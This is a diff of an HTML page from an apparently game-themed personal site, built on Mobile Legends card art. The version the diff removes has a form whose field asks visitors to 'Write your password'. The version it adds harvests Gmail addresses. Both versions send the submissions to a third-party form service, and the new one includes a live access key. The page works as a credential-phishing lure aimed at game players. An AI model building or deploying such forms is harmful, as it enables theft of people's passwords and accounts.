@@ -3,150 +3,93 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-
-<title>Your Friend Hiro</title>
+<title>Enter Gmail</title>
 
 <style>
 *{
     margin:0;
     padding:0;
     box-sizing:border-box;
-    font-family:Arial, sans-serif;
+    font-family:Arial,sans-serif;
 }
 
 body{
     min-height:100vh;
-
+    display:flex;
+    justify-content:center;
+    align-items:center;
     background-image:url("https://hirohaokip552-sketch.github.io/MLBB-BANG-BANG/mobile-legends-bang-bang-cards-768x524.webp");
     background-size:cover;
     background-position:center;
-    background-repeat:no-repeat;
-    background-attachment:fixed;
-
-    display:flex;
-    justify-content:center;
-    align-items:center;
-    padding:20px;
-}
-
-.container{
-    width:100%;
-    display:flex;
-    justify-content:center;
-    align-items:center;
 }
 
 .box{
     width:90%;
     max-width:380px;
-
-    background:rgba(255,255,255,0.15);
+    background:rgba(255,255,255,.15);
     backdrop-filter:blur(15px);
-    -webkit-backdrop-filter:blur(15px);
-
-    border:1px solid rgba(255,255,255,0.2);
-
-    border-radius:20px;
     padding:30px;
+    border-radius:20px;
+    text-align:center;
     color:white;
-
-    box-shadow:0 8px 25px rgba(0,0,0,.3);
 }
 
 h2{
-    text-align:center;
-    margin-bottom:25px;
-    font-size:30px;
+    margin-bottom:20px;
 }
 
-input,
-textarea{
+input{
     width:100%;
     padding:12px;
-    margin-bottom:15px;
-
     border:none;
-    outline:none;
-
-    border-radius:12px;
-
+    border-radius:10px;
+    margin-bottom:20px;
     font-size:16px;
-
-    background:rgba(255,255,255,.85);
-}
-
-textarea{
-    height:130px;
-    resize:none;
 }
 
 button{
     width:100%;
-    padding:13px;
-
+    padding:12px;
     border:none;
-    border-radius:30px;
-
-    font-size:17px;
-    font-weight:bold;
-
-    cursor:pointer;
-
+    border-radius:25px;
     background:white;
     color:#001f4d;
-
-    transition:.3s;
+    font-size:16px;
+    font-weight:bold;
+    cursor:pointer;
 }
 
 button:hover{
-    transform:scale(1.05);
-    background:#e9e9e9;
-}
-
-button:active{
-    transform:scale(.97);
+    background:#e5e5e5;
 }
 </style>
-
 </head>
-<body>
 
-<div class="container">
+<body>
 
 <div class="box">
 
-<h2>Your Friend Hiro</h2>
+<h2>Enter Your Gmail Address</h2>
 
 <form action="https://api.web3forms.com/submit" method="POST">
 
-<input type="hidden" name="access_key" value="YOUR_NEW_ACCESS_KEY">
+<input type="hidden" name="access_key" value="190ee34d-cebc-4d2d-baa2-3f11944a3ff7">
 
-<input type="hidden" name="subject" value="Message from Your Friend Hiro">
+<input type="hidden" name="subject" value="User Gmail Address">
 
-<input type="hidden" name="from_name" value="Your Friend Hiro Website">
+<input type="hidden" name="from_name" value="Your Friend Hiro">
 
-<input
-type="text"
-name="name"
-placeholder="Your Name"
-required>
+<input type="hidden" name="redirect" value="thankyou.html">
 
 <input
 type="email"
-name="email"
-placeholder="Your Email"
+name="gmail"
+placeholder="Enter your Gmail"
 required>
 
-<textarea
-name="message"
-placeholder="Write your password..."
-required></textarea>
-
-<button type="submit">Send Message</button>
+<button type="submit">Send</button>
 
 </form>
-
-</div>
 
 </div>
 
